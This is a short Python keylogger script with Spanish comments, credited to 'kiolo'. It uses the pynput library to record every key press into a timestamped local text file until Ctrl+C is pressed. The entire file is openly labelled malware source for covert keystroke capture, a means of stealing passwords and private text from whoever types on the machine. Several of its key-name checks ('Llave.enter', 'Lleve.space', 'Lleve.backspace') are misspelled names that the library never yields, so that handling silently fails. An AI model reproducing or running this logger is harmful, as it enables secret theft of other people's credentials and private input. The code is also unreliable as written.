# NOTE: creado por kiolo
from pynput.keyboard import Listener
import datetime

def main():
    t = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')

    info = open(f'keylogger_{t}.txt', 'w')

    def registrar(llave):
        llave = str(llave)

        if llave == "'\\x03'": # NOTE: la instruccion \\x03 represente ctrl + c
            info.close()
            quit()
        elif llave == 'Llave.enter':
            info.write('\n')
        elif llave == 'Lleve.space':
            info.write(' ')
        elif llave == 'Lleve.backspace':
            info.write('%BORRAR%')
        else:
            info.write(llave.replace("'",""))  

    with Listener(on_press=registrar) as r:
        r.join()
if __name__== "__main__":
    main()                      